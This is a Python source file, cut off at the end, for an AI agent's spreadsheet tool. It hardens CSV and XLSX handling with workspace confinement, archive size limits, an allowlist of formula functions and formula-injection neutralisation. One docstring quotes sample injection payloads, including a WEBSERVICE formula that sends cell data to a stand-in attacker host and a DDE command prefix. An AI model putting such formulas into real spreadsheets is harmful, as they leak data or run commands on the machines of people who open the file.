"""Spreadsheet tool: read / write / edit CSV + XLSX.

Complements ``pandas_query`` (which *analyzes* tabular data read-only) with a
*write*-capable tool: create sheets, write rows, set individual cells. CSV uses
the stdlib; XLSX uses openpyxl (an optional extra — ops on .xlsx fail with an
actionable "install" message when it's absent, mirroring the other optional-dep
tools). Existing XLSX/XLSM files are bounded to 64 MiB compressed and expanded,
16 MiB per part, and 2,000 parts; external workbook link parts are unsupported.
ZIP64, UTF-16/32 XML and archives with noncanonical directory offsets are also
unsupported. Merged ranges are limited to 2,000 ranges and 100,000 cells per
workbook. These limits do not replace operating-system CPU and memory isolation.
ops: info,
read, write, set_cell.
"""
from __future__ import annotations

import csv as _csv
import io
import os
import re
import stat
import struct
import tempfile
import threading
import zipfile
from contextlib import ExitStack, contextmanager
from pathlib import Path
from typing import Any

from . import Tool

_XLSX_PARSER_SLOTS = threading.BoundedSemaphore(2)

_SPREADSHEET_SCHEMA = {
    "type": "object",
    "properties": {
        "op": {"type": "string", "enum": ["info", "read", "write", "set_cell", "recalculate"]},
        "path": {"type": "string", "description": "path to a .csv, .xlsx or .xlsm file"},
        "rows": {"type": "array", "description": ("rows (list of lists) for write; in an .xlsx a cell "
                                                  "may be a calculation such as =B2-C2 or =SUM(B2:B13)"),
                 "items": {"type": "array"}},
        "sheet": {"type": "string", "description": "sheet name (xlsx; default: first/active)"},
        "sheets": {"type": "object", "description": (
            "xlsx write only, instead of rows and sheet: several sheets in one workbook, "
            "sheet name -> rows (list of lists), in this order, e.g. "
            "{\"North\": [[...]], \"South\": [[...]], \"Summary\": [[...]]}")},
        "cell": {"type": "string", "description": "A1-style cell for set_cell, e.g. 'B2'"},
        "value": {"description": "value for set_cell"},
        "limit": {"type": "integer", "default": 50, "minimum": 1, "maximum": 10000},
    },
    "required": ["op", "path"],
}


def _is_xlsx(path: Path) -> bool:
    return path.suffix.lower() in (".xlsx", ".xlsm")


def _openpyxl():
    try:
        import openpyxl  # noqa: F401
        return openpyxl
    except ImportError as e:
        raise RuntimeError(
            "openpyxl not installed; .xlsx support needs it. "
            "Run: python -m pip install -e './packages/maverick-core[spreadsheet]'") from e


def _safe_path(sandbox, user_path: str) -> Path:
    """Resolve ``user_path`` confined to ``sandbox.workdir`` when available.

    Spreadsheet operations read and write files, so model-supplied paths must
    use the same workspace confinement as filesystem-like tools whenever the
    default registry wires a sandbox into this tool. Without a sandbox, preserve
    direct-path behavior for standalone/unit use.
    """
    if sandbox is None:
        return Path(user_path).expanduser()
    from ..sandbox.ssh import SSHBackend
    if isinstance(sandbox, SSHBackend):
        raise ValueError("host filesystem tools cannot access an SSH workspace")
    workdir = Path(sandbox.workdir).resolve()
    candidate = Path(user_path)
    candidate = (
        candidate.resolve()
        if candidate.is_absolute()
        else (workdir / candidate).resolve()
    )
    try:
        candidate.relative_to(workdir)
    except ValueError as e:
        hint = ("" if not Path(user_path).is_absolute() else
                ". If it is a file attached to this task, read it with read_attachment and "
                "its id; for a CSV, pass `sql` to compute totals and per-row values exactly")
        raise ValueError(
            f"path {user_path!r} escapes the workspace{hint}"
        ) from e
    if getattr(sandbox, "shared_workdir", None) is not None:
        from ..task_workspace import bring_in
        bring_in(sandbox, candidate)
    return candidate


# Characters a spreadsheet app treats as an executable/control cell prefix.
_FORMULA_OPERATORS = ("=", "+", "-", "@")
_FORMULA_TRIGGERS = (*_FORMULA_OPERATORS, "\t", "\r", "\n")


def _neutralize_formula(value: Any) -> Any:
    """Defang a CSV/XLSX formula-injection cell.

    A model-supplied string cell beginning with ``=``, ``+``, ``-``, ``@``, TAB,
    CR, or LF is executed as a formula when the file is opened in Excel / Sheets
    (``=HYPERLINK(...)``, ``=WEBSERVICE("http://attacker/?"&A1)``,
    ``=cmd|'/c ...'``). Prefixing a single quote makes the app render it as
    literal text. Non-string cells (numbers) are left untouched.
    """
    if isinstance(value, str):
        first = value[:1]
        first_non_whitespace = value.lstrip()[:1]
        if (
            first in _FORMULA_TRIGGERS
            or first_non_whitespace in _FORMULA_OPERATORS
        ):
            # Prefix at byte zero. Keeping whitespace before the apostrophe can
            # still let Excel/Sheets treat TAB/CR/LF as a control prefix.
            return "'" + value
    return value


# Workbook formulas an agent may write: arithmetic over cells of this sheet
# with these functions. No text, sheet or file references, links or DDE, so
# nothing reaches outside the cell values. A cash flow forecast written as
# '=B2-C2-D2 text never calculated in Excel.
_PLAIN_FUNCTIONS = frozenset({
    "ABS", "AND", "AVERAGE", "CEILING", "COUNT", "COUNTA", "FLOOR", "FV", "IF", "IFERROR", "INT",
    "IPMT", "IRR", "MAX", "MEDIAN", "MIN", "MOD", "NOT", "NPER", "NPV", "OR", "PMT", "POWER", "PPMT",
    "PRODUCT", "PV", "RATE", "ROUND", "ROUNDDOWN", "ROUNDUP", "SQRT", "SUM", "SUMPRODUCT",
})
_PLAIN_FORMULA_CHARS = re.compile(r"[A-Za-z0-9$.,:()+\-*/^%<>= ]+")
_NAME = re.compile(r"[A-Za-z_][A-Za-z0-9_.]*")
_CELL = re.compile(r"[A-Za-z]{1,3}[0-9]{1,7}")


def _plain_formula(value: Any) -> bool:
    """Whether ``value`` is a workbook formula of the plain kind above."""
    if not isinstance(value, str) or not value.startswith("=") or len(value) > 2000:
        return False
    body = value[1:].replace("$", "")
    if not body.strip() or not _PLAIN_FORMULA_CHARS.fullmatch(body):
        return False
    for word in _NAME.finditer(body):
        if body[word.end():].lstrip().startswith("("):
            if word.group(0).upper() not in _PLAIN_FUNCTIONS:
                return False
        elif not _CELL.fullmatch(word.group(0)) and not re.fullmatch(r"[Ee][0-9]+", word.group(0)):
            return False
    return True


def _xlsx_value(value: Any) -> Any:
    """A workbook cell: a plain formula stays a formula, anything else that
    could run as one is neutralized as in a CSV."""
    return value if _plain_formula(value) else _neutralize_formula(value)


def _recalculate_on_open(workbook) -> None:
    """The file holds no computed values for new formulas; have the app work
    them out when it opens the file."""
    try:
        workbook.calculation.fullCalcOnLoad = True
    except AttributeError:  # pragma: no cover -- an openpyxl without calc properties
        pass


# ---- CSV --------------------------------------------------------------------

def _csv_read(path: Path, limit: int) -> list[list]:
    with path.open(newline="", encoding="utf-8-sig") as f:
        return [row for _, row in zip(range(limit), _csv.reader(f), strict=False)]


@contextmanager
def _atomic_destination(path: Path):
    """Publish only a completed file; failed saves leave the original intact."""
    path.parent.mkdir(parents=True, exist_ok=True)
    previous_mode = stat.S_IMODE(path.stat().st_mode) if path.exists() else None
    fd, name = tempfile.mkstemp(prefix=".lightwork-sheet-", suffix=path.suffix, dir=path.parent)
    os.close(fd)
    temporary = Path(name)
    try:
        yield temporary
        if previous_mode is not None:
            os.chmod(temporary, previous_mode)
        os.replace(temporary, path)
    finally:
        if temporary.exists():
            # A failed Windows replace can leave our staged file read-only.
            # Change only that owned temporary file, never the original.
            os.chmod(temporary, stat.S_IREAD | stat.S_IWRITE)
            temporary.unlink()


def _csv_write(path: Path, rows: list[list]) -> None:
    with _atomic_destination(path) as temporary:
        with temporary.open("w", newline="", encoding="utf-8") as f:
            _csv.writer(f).writerows(
                [_neutralize_formula(c) for c in row] for row in rows
            )


# ---- XLSX -------------------------------------------------------------------

def _validate_xlsx(content: bytes) -> None:
    """Bound ZIP structure and known parser-amplifying spreadsheet features."""
    part_limit = 16 * 1024 * 1024
    expanded_limit = 64 * 1024 * 1024
    # ZipFile eagerly constructs one object per central-directory entry. Check
    # the bounded end record before constructing it, including ZIP64 sentinels.
    offset = content.rfind(b"PK\x05\x06", max(0, len(content) - 65557))
    if offset < 0 or offset + 22 > len(content):
        raise ValueError("Workbook ZIP directory is invalid")
    _, disk, start_disk, disk_entries, total_entries, directory_size, directory_offset, comment_size = struct.unpack_from(
        "<4s4H2LH", content, offset)
    if (disk or start_disk or disk_entries != total_entries or total_entries > 2000
            or total_entries == 0xffff or directory_size > 4 * 1024 * 1024
            or directory_offset + directory_size != offset or offset + 22 + comment_size != len(content)):
        raise ValueError("Workbook ZIP directory exceeds limits or is unsupported")
    cursor = directory_offset
    end = directory_offset + directory_size
    count = 0
    while cursor < end:
        if cursor + 46 > end or content[cursor:cursor + 4] != b"PK\x01\x02":
            raise ValueError("Workbook ZIP directory is invalid")
        name_size, extra_size, comment_size = struct.unpack_from("<3H", content, cursor + 28)
        cursor += 46 + name_size + extra_size + comment_size
        count += 1
        if cursor > end or count > 2000:
            raise ValueError("Workbook ZIP directory exceeds limits")
    if cursor != end or count != total_entries:
        raise ValueError("Workbook ZIP directory count is invalid")
    with zipfile.ZipFile(io.BytesIO(content)) as archive:
        entries = archive.infolist()
        if len(entries) != total_entries or sum(item.file_size for item in entries) > expanded_limit:
            raise ValueError("Workbook expanded size or part count exceeds limits")
        seen = set()
        merged_count = merged_area = 0
        for item in entries:
            name = item.filename
            if (name.casefold() in seen or name.startswith("/") or "\\" in name or ":" in name
                    or any(part in {"", ".", ".."} for part in name.rstrip("/").split("/"))
                    or item.flag_bits & 1 or item.file_size > part_limit):
                raise ValueError("Workbook contains ambiguous, encrypted or oversized parts")
            if name.casefold().startswith("xl/externallinks/"):
                raise ValueError("Workbooks with external links are unsupported")
            seen.add(name.casefold())
            if item.is_dir():
                continue
            # OPC relationships can point to XML under arbitrary part names.
            # Inspect every part for parser-amplifying XML rather than trusting
            # its extension or location. Strip NULs for detection so UTF-16/32
            # cannot hide declarations or merge tags in an oddly named part.
            data = archive.read(item)
            probe = data.replace(b"\x00", b"").upper()
            xml_named = name.lower().endswith((".xml", ".rels"))
            has_merges = b"MERGECELL" in probe
            if b"<!DOCTYPE" in probe or (b"\x00" in data and (xml_named or has_merges)):
                raise ValueError("Workbook XML declarations/entities are unsupported")
            if has_merges:
                merged_count, merged_area = _validate_merged_cells(data, merged_count, merged_area)


def _validate_merged_cells(data: bytes, count: int = 0, area: int = 0) -> tuple[int, int]:
    from lxml import etree
    from openpyxl.utils.cell import range_boundaries

    namespace = "{http://schemas.openxmlformats.org/spreadsheetml/2006/main}mergeCell"
    for _event, node in etree.iterparse(io.BytesIO(data), events=("end",),
                                        resolve_entities=False, load_dtd=False,
                                        no_network=True, huge_tree=False):
        if node.tag == namespace:
            left, top, right, bottom = range_boundaries(node.get("ref") or "")
            if (None in (left, top, right, bottom) or left < 1 or top < 1
                    or right > 16384 or bottom > 1048576 or right < left or bottom < top):
                raise ValueError("Workbook contains an invalid merged range")
            count += 1
            area += (right - left + 1) * (bottom - top + 1)
            if count > 2000 or area > 100000:
                raise ValueError("Workbook merged cells exceed safe limits")
        node.clear()
    return count, area


def _xlsx_snapshot(path: Path) -> bytes:
    """Snapshot and bound an XLSX archive before handing it to openpyxl."""
    content = _xlsx_bytes(path)
    _validate_xlsx(content)
    return content


def _xlsx_bytes(path: Path) -> bytes:
    """Read bounded regular-file bytes without parsing the archive in the host."""
    input_limit = 64 * 1024 * 1024
    fd = os.open(path, os.O_RDONLY | getattr(os, "O_NONBLOCK", 0) | getattr(os, "O_NOFOLLOW", 0))
    with os.fdopen(fd, "rb") as stream:
        info = os.fstat(stream.fileno())
        if not stat.S_ISREG(info.st_mode) or info.st_size > input_limit:
            raise ValueError("Workbook must be a regular file within the 64 MiB input limit")
        content = stream.read(input_limit + 1)
    if len(content) > input_limit:
        raise ValueError("Workbook exceeds the 64 MiB input limit")
    return content

def _xlsx_read_bounds(worksheet, limit: int) -> tuple[int, int]:
    """Inspect actual sparse coordinates before openpyxl expands any rows.

    Worksheet dimensions are optional and may be stale. The read-only source
    accessor avoids materializing cells merely to discover their bounds.
    """
    from lxml import etree
    from openpyxl.utils.cell import coordinate_to_tuple

    namespace = "{http://schemas.openxmlformats.org/spreadsheetml/2006/main}"
    row = column = max_row = max_column = 0
    with worksheet._get_source() as source:
        nodes = etree.iterparse(source, events=("start", "end"), resolve_entities=False,
                                load_dtd=False, no_network=True, huge_tree=False)
        for event, node in nodes:
            if event == "end":
                node.clear()
                while node.getprevious() is not None:
                    del node.getparent()[0]
                continue
            if node.tag == namespace + "row":
                previous = row
                row = int(node.get("r", previous + 1))
                if not previous < row <= 1_048_576:
                    raise ValueError("Spreadsheet contains invalid or unordered rows")
                column = 0
                max_row = min(limit, row)
            elif node.tag == namespace + "c":
                cell_row, cell_column = coordinate_to_tuple(node.get("r")) if node.get("r") else (row, column + 1)
                if cell_row != row or not 0 < cell_column <= 16_384 or cell_column <= column:
                    raise ValueError("Spreadsheet contains invalid or unordered cell coordinates")
                column = cell_column
                if row <= limit:
                    max_column = max(max_column, column)
            if max_row * max_column > 100_000:
                raise ValueError("Spreadsheet read exceeds 100,000 cells; choose a smaller row limit")
        if nodes.root.getroottree().docinfo.doctype:
            raise ValueError("Spreadsheet XML declarations/entities are unsupported")
    return max_row, max_column


def _xlsx_read(path: Path, sheet: str | None, limit: int) -> list[list]:
    content = _xlsx_snapshot(path)
    return _xlsx_read_content(content, sheet, limit)


def _xlsx_read_content(content: bytes, sheet: str | None, limit: int) -> list[list]:
    with ExitStack() as cleanup:
        wb = _openpyxl().load_workbook(io.BytesIO(content), read_only=True, data_only=False, keep_links=False)
        cleanup.callback(wb.close)
        ws = wb[sheet] if sheet else wb.active
        height, width = _xlsx_read_bounds(ws, limit)
        if not height or not width:
            return []
        cached = _openpyxl().load_workbook(io.BytesIO(content), read_only=True, data_only=True, keep_links=False)
        cleanup.callback(cached.close)
        values = cached[ws.title]
        computed = _Computed(ws, values)
        rows = []
        for row, cached_row in zip(ws.iter_rows(max_row=height, max_col=width),
                                   values.iter_rows(max_row=height, max_col=width), strict=True):
            output = []
            for cell, value in zip(row, cached_row, strict=True):
                if cell.data_type == "f":
                    entry = {"formula": str(cell.value), "cached_value": value.value,
                             "value_status": "cached", "cell": cell.coordinate}
                    if value.value is None:
                        # No result is stored; a plain formula is worked out
                        # here and kept apart from the cache it is not.
                        found = computed.value(str(cell.value))
                        entry["value_status"] = "uncalculated" if found is None else "computed"
                        if found is not None:
                            entry["computed_value"] = found
                    output.append(entry)
                else:
                    output.append(cell.value)
            rows.append(output)
        return rows


class _Computed:
    """Values for formula cells a workbook holds no result for (Lightwork's
    own workbooks: Excel calculates them on open). Plain formulas are worked
    out from the sheet's cells; see maverick.sheet_formulas."""

    _MAX_CELLS = 100_000

    def __init__(self, formulas, cached):
        self._sheets = (formulas, cached)
        self._grid: dict[str, Any] | None = None

    def _cells(self) -> dict[str, Any]:
        if self._grid is None:
            from openpyxl.utils import get_column_letter

            formulas, cached = self._sheets
            grid: dict[str, Any] = {}
            for r, (row, cached_row) in enumerate(zip(formulas.iter_rows(), cached.iter_rows(), strict=False), 1):
                for c, (cell, value) in enumerate(zip(row, cached_row, strict=False), 1):
                    if len(grid) >= self._MAX_CELLS:
                        break
                    held = value.value if value.value is not None else cell.value
                    if held is not None:
                        grid[f"{get_column_letter(c)}{r}"] = held
            self._grid = grid
        return self._grid

    def value(self, formula: str) -> int | float | None:
        from ..sheet_formulas import evaluate, plain_number

        result = evaluate(formula, self._cells().get)
        return None if result is None else plain_number(result)


def _isolated_xlsx_read(content: bytes, *, sheet: str | None, limit: int) -> str:
    import json
    _validate_xlsx(content)
    return json.dumps(_xlsx_read_content(content, sheet, limit), default=str)


def _isolated_xlsx_info(content: bytes) -> str:
    _validate_xlsx(content)
    wb = _openpyxl().load_workbook(io.BytesIO(content), read_only=True, keep_links=False)
    try:
        dims = {s: (wb[s].max_row, wb[s].max_column) for s in wb.sheetnames}
        return f"xlsx sheets {dims}"
    finally:
        wb.close()


def _isolated_xlsx_set_cell(
    content: bytes, *, cell: str, value: Any, sheet: str | None, macro: bool,
) -> str:
    import base64
    _validate_xlsx(content)
    output = io.BytesIO()
    if macro:
        from .office_package import WorkbookPackage
        package = WorkbookPackage(content)
        package.set_cell(cell, _neutralize_formula(value), sheet)
        package.write(output)
    else:
        wb = _openpyxl().load_workbook(io.BytesIO(content), keep_links=False)
        try:
            ws = wb[sheet] if sheet and sheet in wb.sheetnames else (
                wb.create_sheet(sheet) if sheet else wb.active
            )
            ws[cell] = _xlsx_value(value)
            _recalculate_on_open(wb)
            wb.save(output)
        finally:
            wb.close()
    result = output.getvalue()
    if len(result) > 11 * 1024 * 1024:
        raise ValueError("Edited workbook exceeds the 11 MiB worker output limit")
    return base64.b64encode(result).decode("ascii")


def _xlsx_isolated(path: Path, name: str, **kwargs) -> str:
    return _xlsx_isolated_bytes(_xlsx_bytes(path), name, **kwargs)


def _xlsx_isolated_bytes(data: bytes, name: str, **kwargs) -> str:
    from ..parser_isolation import parse_isolated
    if not _XLSX_PARSER_SLOTS.acquire(timeout=0.25):
        raise RuntimeError("spreadsheet parsing is busy; retry later")
    try:
        result = parse_isolated(name, data, timeout=30.0, **kwargs)
    finally:
        _XLSX_PARSER_SLOTS.release()
    if not isinstance(result, str):
        raise RuntimeError("spreadsheet parser returned an invalid result")
    return result


def _xlsx_write(path: Path, rows: list[list], sheet: str | None) -> None:
    op = _openpyxl()
    path.parent.mkdir(parents=True, exist_ok=True)
    wb = op.Workbook()
    try:
        ws = wb.active
        if sheet:
            ws.title = sheet
        for row in rows:
            ws.append([_xlsx_value(c) for c in row])
        _recalculate_on_open(wb)
        with _atomic_destination(path) as temporary:
            wb.save(temporary)
    finally:
        wb.close()


_BAD_SHEET_NAME = re.compile(r"[\[\]:*?/\\]")


def _sheets_arg(value: Any) -> dict[str, list[list]]:
    """The ``sheets`` argument checked: 1 to 50 sheets, each a valid Excel
    sheet name (at most 31 characters, none of []:*?/\\) with rows."""
    if not isinstance(value, dict) or not 1 <= len(value) <= 50:
        raise RuntimeError("sheets must map 1 to 50 sheet names to rows")
    checked: dict[str, list[list]] = {}
    for name, rows in value.items():
        if not isinstance(name, str) or not name.strip() or len(name) > 31 or _BAD_SHEET_NAME.search(name):
            raise RuntimeError(f"sheet name {name!r} is not allowed in Excel "
                               "(1-31 characters, none of [ ] : * ? / \\)")
        if not isinstance(rows, list) or any(not isinstance(row, list) for row in rows):
            raise RuntimeError(f"sheet {name!r} needs rows (list of lists)")
        checked[name] = [list(row) for row in rows]
    return checked


def _xlsx_write_sheets(path: Path, sheets: dict[str, list[list]]) -> None:
    op = _openpyxl()
    path.parent.mkdir(parents=True, exist_ok=True)
    wb = op.Workbook()
    try:
        for index, (name, rows) in enumerate(sheets.items()):
            ws = wb.active if index == 0 else wb.create_sheet()
            ws.title = name
            for row in rows:
                ws.append([_xlsx_value(c) for c in row])
        _recalculate_on_open(wb)
        with _atomic_destination(path) as temporary:
            wb.save(temporary)
    finally:
        wb.close()


def _xlsx_set_cell(path: Path, cell: str, value: Any, sheet: str | None) -> None:
    op = _openpyxl()
    existing = path.exists()
    wb = op.load_workbook(io.BytesIO(_xlsx_snapshot(path)), keep_links=False) if existing else op.Workbook()
    try:
        if sheet and sheet in wb.sheetnames:
            ws = wb[sheet]
        elif sheet and existing:
            # Preserve other sheets and their cross-sheet references.
            ws = wb.create_sheet(sheet)
        else:
            ws = wb.active
            if sheet:
                ws.title = sheet
        ws[cell] = _xlsx_value(value)
        _recalculate_on_open(wb)
        with _atomic_destination(path) as temporary:
            wb.save(temporary)
    finally:
        wb.close()


# ---- dispatch ---------------------------------------------------------------

def _special_operation(path, op, sandbox):
    if path.suffix.lower() == ".xlsm" and op == "write":
        return "ERROR: replacing an entire .xlsm workbook is unsupported; use set_cell to preserve its macros"
    if path.suffix.lower() == ".xlsm" and op == "set_cell":
        from ..config import get_document_tools
        if not get_document_tools()["macro_cell_edits"]:
            return "ERROR: .xlsm cell edits require documents.macro_cell_edits=true; macros are preserved but never executed"
    if op == "recalculate":
        if not _is_xlsx(path) or not path.is_file():
            return "ERROR: recalculate requires an existing .xlsx or .xlsm workbook"
        from ..file_lock import workspace_file_lock
        from .document_processing import recalculate
        with workspace_file_lock(path, strict=True):
            return recalculate(path, sandbox)
    return None


def _is_single_cell(cell: str) -> bool:
    # A new workbook is edited in the host process, where openpyxl expands a
    # range such as "A1:XFD1048576" into every cell before failing. Accept one
    # coordinate inside the Excel limits (the isolated worker's own check).
    match = re.fullmatch(r"\$?([A-Za-z]{1,3})\$?([1-9][0-9]{0,6})", cell)
    if match is None:
        return False
    column = 0
    for letter in match.group(1).upper():
        column = column * 26 + ord(letter) - 64
    return column <= 16384 and int(match.group(2)) <= 1048576


def _charge_quota(rows: list[list], goal_id) -> None:
    """Charge a write to the goal's file-write quota (the one ``write_file`` uses).

    The size is each cell's text plus a separator, an estimate of the CSV
    (and of xlsx). It is computed without the CSV writer, so sizing never
    touches the write path. Raises ``RuntimeError`` (reported as
    ``ERROR: ...``) when the write would cross it.
    """
    from ..file_quota import check_and_add
    size = sum(len(str(cell).encode("utf-8", "replace")) + 1 for row in rows for cell in row)
    size += sum(1 for row in rows if not row)
    ok, msg = check_and_add(size, goal_id=goal_id)
    if not ok:
        raise RuntimeError(msg)


def _write_sheets(path: Path, value: Any, goal_id) -> str:
    """``write`` with ``sheets``: several named sheets in one new workbook.
    Asked for one sheet per region and a Summary, an agent could write only
    one sheet: every write replaced the workbook."""
    if not _is_xlsx(path):
        return "ERROR: sheets is for an .xlsx file; a CSV file holds one table"
    sheets = _sheets_arg(value)
    for rows in sheets.values():
        _charge_quota(rows, goal_id)
    from ..file_lock import workspace_file_lock
    with workspace_file_lock(path, strict=True):
        _xlsx_write_sheets(path, sheets)
    notes = "".join(_totals_note(rows, path).replace("The totals", f"On sheet {name!r} the totals", 1)
                    for name, rows in sheets.items())
    return f"wrote {len(sheets)} sheet(s) ({', '.join(sheets)}) to {path}" + notes


def _totals_note(rows: list[list], path: Path) -> str:
    """A note when a total row in the written sheet does not add up (a typed
    payroll total was a dollar off)."""
    from ..figure_totals import rows_issues

    issues = rows_issues(rows)
    if not issues:
        return ""
    fix = ("write the correct figure, or a formula such as =SUM(B2:B9) so Excel adds the rows"
           if _is_xlsx(path) else "write the correct figure")
    return "\nThe totals do not add up: " + " ".join(issues) + f" Fix the file before you deliver it: {fix}."


def _set_cell_operation(path, args, sheet, goal_id="default"):
    if not _is_xlsx(path):
        return "ERROR: set_cell is xlsx-only; use write for csv"
    cell = str(args.get("cell") or "").strip()
    if not cell:
        return "ERROR: set_cell requires cell (e.g. 'B2')"
    if not _is_single_cell(cell):
        return f"ERROR: set_cell needs a single A1 cell such as 'B2', not {cell[:40]!r}"
    _charge_quota([[cell, args.get("value")]], goal_id)
    from ..file_lock import workspace_file_lock
    with workspace_file_lock(path, strict=True):
        if path.exists():
            import base64
            encoded = _xlsx_isolated(
                path, "spreadsheet_set_cell", cell=cell, value=args.get("value"),
                sheet=sheet, macro=path.suffix.lower() == ".xlsm",
            )
            workbook_bytes = base64.b64decode(encoded, validate=True)
            if len(workbook_bytes) > 11 * 1024 * 1024:
                raise ValueError("Edited workbook exceeds the 11 MiB worker output limit")
            with _atomic_destination(path) as temporary:
                temporary.write_bytes(workbook_bytes)
        else:
            if path.suffix.lower() == ".xlsm":
                raise ValueError("Macro workbook must already exist for a cell edit")
            _xlsx_set_cell(path, cell, args.get("value"), sheet)
    return f"set {cell} in {path}"


def _workspace_gate(sandbox, raw_path: str, path: Path, op) -> None:
    """Apply the file tools' `.git` write refusal and opaque-mode read gate.

    Raises ``ValueError`` when the operation is refused; no-op without a sandbox.
    """
    if sandbox is None:
        return
    from .fs import _is_opaque_blocked_resolved
    if op in ("info", "read"):
        if _is_opaque_blocked_resolved(sandbox, raw_path):
            raise ValueError("spreadsheet read blocked in benchmark opaque mode (.git/tests)")
        return
    rel = path.relative_to(Path(sandbox.workdir).resolve())
    if any(part.rstrip(" .").casefold() == ".git" for part in rel.parts):
        raise ValueError(f"refusing to write under .git/: {rel}")


def _run(args: dict[str, Any], sandbox=None, goal_id="default") -> str:
    op = args.get("op")
    raw_path = str(args.get("path") or "")
    if not op:
        return "ERROR: op is required"
    if not raw_path:
        return "ERROR: path is required"
    try:
        path = _safe_path(sandbox, raw_path)
        _workspace_gate(sandbox, raw_path, path, op)
    except ValueError as e:
        return f"ERROR: {e}"
    limit = args.get("limit", 50)
    if type(limit) is not int or not 1 <= limit <= 10000:
        return "ERROR: limit must be an integer between 1 and 10000"
    sheet = args.get("sheet")
    try:
        special = _special_operation(path, op, sandbox)
        if special is not None:
            return special
        if op == "info":
            if not path.exists():
                return f"ERROR: no such file {path}"
            if _is_xlsx(path):
                return _xlsx_isolated(path, "spreadsheet_info")
            rows = _csv_read(path, 10_001)
            if len(rows) > 10_000:
                return f"csv rows=10001+ cols={len(rows[0])} (at least 10001 rows; count limited)"
            return f"csv rows={len(rows)} cols={len(rows[0]) if rows else 0}"
        if op == "read":
            if not path.exists():
                return f"ERROR: no such file {path}"
            if _is_xlsx(path):
                return _xlsx_isolated(path, "spreadsheet_read", sheet=sheet, limit=limit)
            rows = _csv_read(path, limit)
            import json
            return json.dumps(rows, default=str)
        if op == "write" and args.get("sheets") is not None:
            return _write_sheets(path, args["sheets"], goal_id)
        if op == "write":
            rows = args.get("rows")
            if not isinstance(rows, list) or any(not isinstance(row, list) for row in rows):
                return "ERROR: write requires rows (list of lists)"
            norm = [list(r) for r in rows]
            _charge_quota(norm, goal_id)
            from ..file_lock import workspace_file_lock
            with workspace_file_lock(path, strict=True):
                if _is_xlsx(path):
                    _xlsx_write(path, norm, sheet)
                else:
                    _csv_write(path, norm)
            return f"wrote {len(rows)} row(s) to {path}" + _totals_note(norm, path)
        if op == "set_cell":
            return _set_cell_operation(path, args, sheet, goal_id)
    except RuntimeError as e:
        return f"ERROR: {e}"
    except Exception as e:  # noqa: BLE001
        return f"ERROR: spreadsheet {op} failed: {type(e).__name__}: {e}"
    return f"ERROR: unknown op {op!r}"


def spreadsheet(sandbox=None, goal_id: str | int | None = "default") -> Tool:
    quota_goal_id = "default" if goal_id is None else goal_id
    return Tool(
        name="spreadsheet",
        description=(
            "Read / write / edit CSV + XLSX spreadsheets. ops: info (sheets + "
            "dims), read (rows as JSON), write (rows -> file, or sheets -> one .xlsx "
            "with several named sheets; to change a workbook, read it, change the rows, "
            "formulas included, and write them back), set_cell (xlsx "
            "A1-cell), recalculate (offline LibreOffice engine when enabled). "
            "Formula cells include formula, cached_value and value_status; a cache is "
            "not proof of fresh calculation, and value_status 'computed' means Lightwork worked "
            "out a plain formula (sums, arithmetic, rounding) from the sheet's cells. Enabled .xlsm cell edits preserve VBA without executing it."
        ),
        input_schema=_SPREADSHEET_SCHEMA,
        fn=lambda args: _run(args, sandbox, quota_goal_id),
    )


def spreadsheet_read(sandbox=None) -> Tool:
    """Read an existing workbook without permitting any file/engine mutation."""
    properties = {key: value for key, value in _SPREADSHEET_SCHEMA["properties"].items()
                  if key in {"op", "path", "sheet", "limit"}}
    properties["op"] = {"type": "string", "enum": ["info", "read", "query"]}
    properties["paths"] = {"type": "array", "items": {"type": "string"}, "maxItems": _MAX_QUERY_FILES,
                           "description": "For query: workspace CSV or Excel (.xlsx, first sheet) files; each is a table named after its file."}
    properties["sql"] = {"type": "string", "description": "For query: one read-only SELECT."}

    def run(args):
        if args.get("op") == "query":
            return _query(args, sandbox)
        if args.get("op") not in ("info", "read"):
            return "ERROR: spreadsheet_read supports only info/read/query; draft changes in your response"
        return _run(args, sandbox)

    return Tool(
        name="spreadsheet_read",
        description=("Read existing workspace CSV/XLSX/XLSM metadata or rows, or compare CSV "
                     "or Excel files exactly with op=query: one read-only SELECT over `paths`, "
                     "each file a table named after it (invoices.csv -> invoices; an Excel "
                     "file's first sheet). Use query for "
                     "totals, duplicates and cross-file checks instead of comparing by eye. "
                     "Cannot write, edit or recalculate. Formula cells include cached values "
                     "and freshness status. Draft proposed changes in the response for a "
                     "human to apply."),
        input_schema={"type": "object", "properties": properties,
                      "required": ["op"], "additionalProperties": False},
        fn=run,
    )


_MAX_QUERY_FILES = 10
_MAX_QUERY_BYTES = 2_000_000
_XLSX_QUERY_ROWS = 20_000


def _query(args: dict[str, Any], sandbox) -> str:
    """op=query: one read-only SELECT over workspace CSV or Excel files (tools.csv_query)."""
    import re

    from .csv_query import query_tables

    paths, sql = args.get("paths"), str(args.get("sql") or "").strip()
    if not isinstance(paths, list) or not paths or len(paths) > _MAX_QUERY_FILES:
        return f"ERROR: query needs paths: 1 to {_MAX_QUERY_FILES} workspace CSV files"
    if not sql:
        return "ERROR: query needs sql: one SELECT"
    tables: dict[str, tuple[str, str]] = {}
    for raw in paths:
        try:
            path = _safe_path(sandbox, str(raw))
            _workspace_gate(sandbox, str(raw), path, "read")
        except ValueError as e:
            return f"ERROR: {e}"
        if path.suffix.lower() != ".csv" and not _is_xlsx(path):
            return f"ERROR: {raw} is not a CSV or Excel (.xlsx) file"
        if not path.is_file():
            return f"ERROR: no such file {raw}"
        if path.stat().st_size > _MAX_QUERY_BYTES:
            return f"ERROR: {raw} is larger than {_MAX_QUERY_BYTES:,} bytes"
        name = re.sub(r"[^a-z0-9_]", "_", path.stem.lower()) or "data"
        if name in tables:
            return f"ERROR: two files would both be the table {name}"
        text = _xlsx_as_csv(path) if _is_xlsx(path) else path.read_text(encoding="utf-8", errors="replace")
        tables[name] = (str(raw), text)
    return query_tables(tables, sql)


def _xlsx_as_csv(path: Path) -> str:
    """The first sheet of a workbook as CSV text, read through the same isolated
    parser as op=read; a formula cell contributes its cached value. Without it,
    an agent that wrote a workbook fell back to a shell command to total it."""
    return xlsx_bytes_as_csv(_xlsx_bytes(path))


def _cell_value(cell: dict) -> Any:
    """A formula cell's stored result, or the value Lightwork computed."""
    stored = cell.get("cached_value")
    return stored if stored is not None else cell.get("computed_value", "")


def xlsx_bytes_as_csv(data: bytes) -> str:
    """:func:`_xlsx_as_csv` for a workbook already in memory (an attachment)."""
    import csv
    import json

    rows = json.loads(_xlsx_isolated_bytes(data, "spreadsheet_read", sheet=None, limit=_XLSX_QUERY_ROWS))
    out = io.StringIO()
    writer = csv.writer(out, lineterminator="\n")
